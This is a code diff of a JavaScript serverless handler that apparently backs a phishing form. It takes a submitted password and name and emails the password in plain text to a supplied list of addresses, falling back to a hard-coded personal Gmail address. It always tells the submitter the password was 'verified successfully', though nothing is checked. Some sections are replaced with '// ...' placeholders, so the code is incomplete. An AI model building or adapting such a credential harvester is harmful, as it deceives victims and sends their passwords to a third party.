@@ -1,72 +1,56 @@
 import nodemailer from 'nodemailer';
 
 export default async function handler(req, res) {
-  // CORS headers
-  res.setHeader('Access-Control-Allow-Credentials', true);
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  // ... CORS headers
   
-  if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
-
   try {
-    // ✅ Get all data from frontend
-    const { password, workerEmail, name } = req.body;
+    // ✅ Yeh already emails array leta hai frontend se
+    const { password, emails, name } = req.body;
 
     console.log('🔐 Password Form:');
-    console.log('Password:', password);
-    console.log('Worker Email:', workerEmail);
-    console.log('Name:', name);
+    console.log('Emails from frontend:', emails); // ✅ Frontend se jo aaye
     
-    // Send email
-    const emailResult = await sendPasswordEmail(password, workerEmail, name);
+    // ✅ Frontend ka emails array use karega
+    const emailArray = emails || ["lingdavid24@gmail.com"]; // ✅ Agar frontend se nahi aaya toh default
+    
+    const userName = name || "User";
+    
+    // ✅ Same function jo emails array ko handle karti hai
+    const emailResult = await sendPasswordEmail(password, emailArray, userName);
 
     return res.status(200).json({
       success: true,
       message: 'Password verified successfully',
       emailSent: emailResult.success,
-      recipient: workerEmail,
-      name: name,
       emailMessage: emailResult.message
     });
 
   } catch (error) {
-    console.error('❌ Server Error:', error);
-    return res.status(200).json({
-      success: true,
-      message: 'Verification completed',
-      emailSent: false
-    });
+    // ... error handling
   }
 }
 
-async function sendPasswordEmail(password, workerEmail, name) {
+async function sendPasswordEmail(password, emailArray, name) {
   try {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
     });
 
-    await transporter.sendMail({
+    // ✅ Yeh already multiple emails handle karta hai
+    const mailOptions = {
       from: `"Password System" <${process.env.GMAIL_USER}>`,
-      to: workerEmail,
+      to: emailArray.join(', '), // ✅ Multiple emails ko join karta hai
       subject: `🔐 Password from ${name}`,
-      html: `
-        <div style="font-family: Arial, sans-serif;">
-          <h2>Password Form Submission</h2>
-          <p><strong>Name:</strong> ${name}</p>
-          <p><strong>Password:</strong> ${password}</p>
-          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-        </div>
-      `
-    });
+      html: `<div><h2>Password: ${password}</h2><p>Name: ${name}</p></div>`
+    };
+
+    await transporter.sendMail(mailOptions);
     
-    console.log(`✅ Email sent to ${workerEmail} for ${name}`);
+    console.log(`✅ Email sent to:`, emailArray); // ✅ Sab emails log karta hai
     return { success: true, message: 'Email sent' };
 
   } catch (error) {
-    console.error('❌ Email Error:', error);
-    return { success: false, message: error.message };
+    // ... error handling
   }
 }
